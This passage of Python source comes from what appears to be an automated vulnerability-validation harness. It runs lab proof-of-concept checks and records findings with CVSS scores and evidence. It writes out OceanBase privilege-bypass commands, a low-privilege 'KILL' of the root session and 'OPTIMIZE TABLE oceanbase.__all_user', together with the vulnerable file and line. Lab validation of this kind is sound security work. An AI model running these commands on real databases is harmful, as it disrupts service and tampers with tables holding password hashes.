                    "proven_in_lab": True,
                    "poc_result": "triggered",
                    "poc": {
                        "host": host, "port": port,
                        "user": "lotus_usage", "killed": kres.get("root_id"),
                    },
                    "lab_evidence": [{
                        "path": f"mysql://{host}:{port}",
                        "command": f"SHOW PROCESSLIST; KILL {kres.get('root_id')}",
                        "snippet": json.dumps({
                            "visible": kres.get("root_visible_to_lowpriv"),
                            "kill_ok": kres.get("kill_ok"),
                            "root_dead": kres.get("root_dead"),
                            "ping": kres.get("ping_error"),
                            "flush": kres.get("flush_privileges_as_lowpriv"),
                        }),
                        "anomaly_type": "auth_bypass",
                    }],
                    "canonical_class": "authz_bypass",
                    "measurements": {
                        "before": "root session alive",
                        "after": "root connection lost (2013)",
                        "lowpriv_grants": "USAGE only (lotus_usage)",
                    },
                })
                if send:
                    await send(repo_id, "PROVEN: lotus_usage KILL root session")
                break
            elif send:
                await send(repo_id, f"seekdb KILL on {host}:{port} not proven: {str(kres)[:180]}")

        for port in s_ports:
            try:
                ores = await asyncio.to_thread(seekdb_optimize_any_table, host, port)
            except Exception as e:
                if send:
                    await send(repo_id, f"seekdb OPTIMIZE PoC port {port} error: {e}")
                continue
            if ores.get("ok"):
                findings.append({
                    "tool": "library-lab-poc",
                    "title": "USAGE-only user can OPTIMIZE/ALTER system catalog tables",
                    "cvss": 8.1,
                    "description": (
                        "T_OPTIMIZE_TABLE is mapped to no_priv_needed. "
                        "ObLocalManagementService::optimize_table sets "
                        "skip_sys_table_check_=true then AlterTable(PROGRESSIVE_MERGE_ROUND). "
                        f"lotus_usage has no grants on oceanbase (SHOW TABLES denied="
                        f"{ores.get('show_tables_denied')}) but OPTIMIZE TABLE oceanbase.__all_user "
                        f"changed progressive_merge_round "
                        f"{ores.get('before_merge_round')}→{ores.get('after_merge_round')} "
                        f"and schema_version {ores.get('before_schema_version')}→"
                        f"{ores.get('after_schema_version')}. __all_user stores passwd hashes."
                    ),
                    "file": "src/rootserver/ob_local_management_service.cpp",
                    "line": 1721,
                    "confidence": "high",
                    "qualification": "QUALIFIED",
                    "conviction_level": 3,
                    "proven_in_lab": True,
                    "poc_result": "triggered",
                    "poc": {
                        "host": host, "port": port, "user": "lotus_usage",
                        "sql": "OPTIMIZE TABLE oceanbase.__all_user",
                    },
                    "lab_evidence": [{
                        "path": f"mysql://{host}:{port}",
                        "command": "OPTIMIZE TABLE oceanbase.__all_user",
                        "snippet": json.dumps({
                            "show_tables_denied": ores.get("show_tables_denied"),
                            "before_round": ores.get("before_merge_round"),
                            "after_round": ores.get("after_merge_round"),
                            "before_sv": ores.get("before_schema_version"),
                            "after_sv": ores.get("after_schema_version"),
                        }),
                        "anomaly_type": "auth_bypass",
                    }],
                    "canonical_class": "authz_bypass",
                    "measurements": {
                        "before_merge_round": ores.get("before_merge_round"),
                        "after_merge_round": ores.get("after_merge_round"),
                        "before_schema_version": ores.get("before_schema_version"),
                        "after_schema_version": ores.get("after_schema_version"),
                    },
                })
                if send:
                    await send(repo_id, "PROVEN: lotus_usage OPTIMIZE oceanbase.__all_user")
                break
            elif send:
                await send(repo_id, f"seekdb OPTIMIZE on {host}:{port} not proven: {str(ores)[:180]}")

        for port in s_ports:
            try:
                dres = await asyncio.to_thread(seekdb_disprove_stubs, host, port)
            except Exception as e:
                if send:
                    await send(repo_id, f"seekdb stub DISPROVE port {port} error: {e}")
                continue
            if dres.get("ok"):
                disproven.extend(dres.get("items") or [])
                if send:
                    await send(repo_id, f"seekdb stub DISPROVE recorded {len(dres.get('items') or [])} items")
                break

    # --- PDF::Reader gem PoCs (container or host ruby) ---
    if language.startswith("ruby") or (dest / "lib" / "pdf" / "reader.rb").exists():
        runner = None
        if container:
            ready = await ensure_ruby_gem_lab(container, dest, send=send, repo_id=repo_id)
            if ready:
                async def _run_c(argv, _c=container):
                    return await _docker_exec(_c, argv, timeout=25)
                runner = _run_c
        if runner is None:
            ready = await ensure_ruby_gem_host(dest, send=send, repo_id=repo_id)
            if ready:
                async def _run_h(argv):
                    return await _local_exec(argv, timeout=25)
                runner = _run_h
        if send:
            await send(repo_id, f"pdf-reader gem smoke: {'ok' if runner else 'FAILED'}")
        if runner:
            for spec in pdf_reader_poc_scripts():
                out, rc = await runner(spec["argv"])
                proven = spec["prove"](out)
                disproved = (not proven) and spec["disprove_ok"](out)
                if proven:
                    findings.append({
                        "tool": "library-lab-poc",
                        "title": spec["title"],
                        "cvss": spec["cvss"],
                        "description": f"Lab PoC PROVEN. rc={rc} output={out[:400]}",
                        "file": spec["file"],
                        "line": 0,
                        "confidence": "high",
                        "qualification": "QUALIFIED",
                        "conviction_level": 3,
                        "proven_in_lab": True,
                        "poc_result": "triggered",
                        "poc": {"id": spec["id"]},
                        "lab_evidence": [{
                            "path": spec["file"],
                            "command": spec["id"],
                            "snippet": (out or "")[:240],
                            "anomaly_type": spec["class"],
                        }],
                        "canonical_class": spec["class"],
                    })
                elif send:
                    await send(
                        repo_id,
                        f"{'DISPROVEN' if disproved else 'INCONCLUSIVE'} {spec['id']}: {(out or '')[:160]}",
                    )

    # Control-plane PoCs (execd empty token, CubeAPI default-allow, keploy Join,
    # asynq Redis worker, FFmpeg nested protocol). Native, not HTTP-gated.
    try:
        from backend.lab_provider import provider_name
        _cp_provider = provider_name()
        # An unavailable adapter is a coverage gap only for a repository the
        # existing dispatcher would select. Inspect static markers without
        # importing or executing that Docker-only module on Kubernetes.
        _cp_name = dest.name.lower()
        _cp_applicable = any(name in _cp_name for name in (
            "opensandbox", "keploy", "cubesandbox", "asynq", "ffmpeg")) or any((dest / marker).is_dir() for marker in (
                "components/execd", "pkg/platform/yaml", "CubeAPI")) or any((dest / marker).is_file() for marker in (
                    "inspector.go", "libavformat/concatdec.c"))
        if _cp_provider != "docker" and not _cp_applicable:
            cp = {}
        elif _cp_provider != "docker":
            _cp_reason = (f"unsupported runtime {_cp_provider}: control-plane validation has no "
                          "Kubernetes adapter; Docker-only runner was not imported or executed")
            runtime_gaps.append({"name": "control-plane-pocs", "status": "skipped", "reason": _cp_reason})
            if send:
                await send(repo_id, _cp_reason, level="warning")
            cp = {}
        else:
            from backend.control_plane_poc import run_control_plane_pocs
            cp = await asyncio.to_thread(run_control_plane_pocs, dest)
        for spec in (cp.get("proven") or []):
            _scope = str(spec.get("evidence_scope") or "package-harness")
            _target_bound = bool(spec.get("target_bound") is True and _scope not in {"analog", "package-harness"})
            findings.append({
                "tool": "library-lab-poc",
                "title": spec.get("title") or spec.get("id"),
                "cvss": spec.get("cvss") or 7.5,
                "description": (
                    f"Lab PoC PROVEN. oracles={spec.get('oracles')} "
                    f"measurements={spec.get('measurements')} "
                    f"output={(spec.get('output') or '')[:400]}"
                ),
                "file": spec.get("file") or "",
                "line": 0,
                "confidence": "high",
                "qualification": "QUALIFIED" if _target_bound else "CANDIDATE",
                "conviction_level": 3,
                "proven_in_lab": _target_bound,
                "poc_result": "triggered",
                "poc": {"id": spec.get("id")},
                "lab_evidence": [{
                    "path": spec.get("file") or "",
                    "command": spec.get("id"),
                    "snippet": (spec.get("output") or "")[:240],
                    "anomaly_type": spec.get("canonical_class") or "authz_bypass",
                }],
                "canonical_class": spec.get("canonical_class") or "authz_bypass",
                "measurements": spec.get("measurements") or {},
                "evidence_scope": _scope,
                "target_bound": _target_bound,
                "proof_authority": spec.get("proof_authority") or "unattested-package-harness",
                "analog_source": spec.get("analog_source") or "",
                "attestation_rejected_reason": None if _target_bound else "package harness is not default deployment proof",
            })
        if send:
            for spec in (cp.get("disproven") or []):
                await send(repo_id, f"DISPROVEN {spec.get('id')}: {(spec.get('output') or '')[:160]}")
            n = len(cp.get("proven") or [])
            await send(repo_id, f"control-plane PoCs proven={n}")
    except Exception as e:
        if send:
            await send(repo_id, f"control-plane PoCs error: {e}")

    try:
        from backend.gateway_poc import run_gateway_pocs
        gw = await asyncio.to_thread(run_gateway_pocs, dest)
        for spec in (gw.get("proven") or []):
            _scope = str(spec.get("evidence_scope") or "analog")
            findings.append({
                "tool": "library-lab-poc",
                "title": spec.get("title") or spec.get("id"),
                "cvss": spec.get("cvss") or 8.6,
                "description": (
                    f"Lab PoC PROVEN. oracles={spec.get('oracles')} "
                    f"measurements={spec.get('measurements')} "
                    f"output={(spec.get('output') or '')[:400]}"
                ),
                "file": spec.get("file") or "",
                "line": 0,
                "confidence": "high",
                "qualification": "CANDIDATE",
                "conviction_level": 3,
                "proven_in_lab": False,
                "poc_result": "triggered",
                "poc": {"id": spec.get("id")},
                "lab_evidence": [{
                    "path": spec.get("file") or "",
                    "command": spec.get("id"),
                    "snippet": (spec.get("output") or "")[:240],
                    "anomaly_type": spec.get("canonical_class") or "authz_bypass",
                }],
                "canonical_class": spec.get("canonical_class") or "authz_bypass",
                "measurements": spec.get("measurements") or {},
                "evidence_scope": _scope,
                "target_bound": False,
                "proof_authority": spec.get("proof_authority") or "unattested-analog",
                "analog_source": spec.get("analog_source") or gw.get("analog") or "",
                "attestation_rejected_reason": "gateway PoC executed against stdlib analog, not the enrolled target",
            })
        if send:
            for spec in (gw.get("disproven") or []):
                await send(repo_id, f"DISPROVEN {spec.get('id')}: {(spec.get('output') or '')[:160]}")
            n = len(gw.get("proven") or [])
            await send(repo_id, f"gateway-control-plane PoCs proven={n}")
    except Exception as e:
        if send:
            await send(repo_id, f"gateway-control-plane PoCs error: {e}")

    try:
        from backend.agent_app_poc import run_agent_app_pocs
        aa = await asyncio.to_thread(run_agent_app_pocs, dest)
        for spec in (aa.get("proven") or []):
            _scope = str(spec.get("evidence_scope") or "analog")
            findings.append({
                "tool": "library-lab-poc",
                "title": spec.get("title") or spec.get("id"),
                "cvss": spec.get("cvss") or 8.6,
                "description": (
                    f"Lab PoC PROVEN. oracles={spec.get('oracles')} "
                    f"measurements={spec.get('measurements')} "
                    f"output={(spec.get('output') or '')[:400]}"
                ),
                "file": spec.get("file") or "",
                "line": 0,
                "confidence": "high",
                "qualification": "CANDIDATE",
                "conviction_level": 3,
                "proven_in_lab": False,
                "poc_result": "triggered",
                "poc": {"id": spec.get("id")},
                "lab_evidence": [{
                    "path": spec.get("file") or "",
                    "command": spec.get("id"),
                    "snippet": (spec.get("output") or "")[:240],
                    "anomaly_type": spec.get("canonical_class") or "authz_bypass",
                }],
                "canonical_class": spec.get("canonical_class") or "authz_bypass",
                "measurements": spec.get("measurements") or {},
                "evidence_scope": _scope,
                "target_bound": False,
                "proof_authority": spec.get("proof_authority") or "unattested-analog",
                "analog_source": spec.get("analog_source") or aa.get("analog") or "",
                "attestation_rejected_reason": "agent/application PoC executed against stdlib analog, not the enrolled target",
            })
        if send:
            for spec in (aa.get("disproven") or []):
                await send(repo_id, f"DISPROVEN {spec.get('id')}: {(spec.get('output') or '')[:160]}")
            n = len(aa.get("proven") or [])
            await send(repo_id, f"agent-app-control-plane PoCs proven={n}")
    except Exception as e:
        if send:
            await send(repo_id, f"agent-app-control-plane PoCs error: {e}")

    try:
        out_dir = dest / ".lotus"
        out_dir.mkdir(exist_ok=True)
        (out_dir / "lab_poc_results.json").write_text(
            json.dumps({
                "proven": [{
                    "tool": f.get("tool"),
                    "title": f.get("title"),
                    "cvss": f.get("cvss"),
                    "file": f.get("file"),
                    # Preserve the runner's raw observation status here.  The
                    # integrity checker separately flags rows lacking a signed
                    # receipt or target binding; rewriting them to false would
                    # erase useful evidence.
                    "proven_in_lab": bool(f.get("proven_in_lab") is True),
                    "evidence_scope": f.get("evidence_scope") or "unknown",
                    "target_bound": bool(f.get("target_bound") is True),
                    "proof_authority": f.get("proof_authority") or "",
                    "attestation_rejected_reason": f.get("attestation_rejected_reason") or "",
                    "proof_receipt": f.get("proof_receipt"),
                    "poc": f.get("poc"),
                    "lab_evidence": f.get("lab_evidence"),
                    "measurements": f.get("measurements"),
                } for f in findings],
                "disproven": disproven,
                "runtime_gaps": runtime_gaps,
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass
    return findings
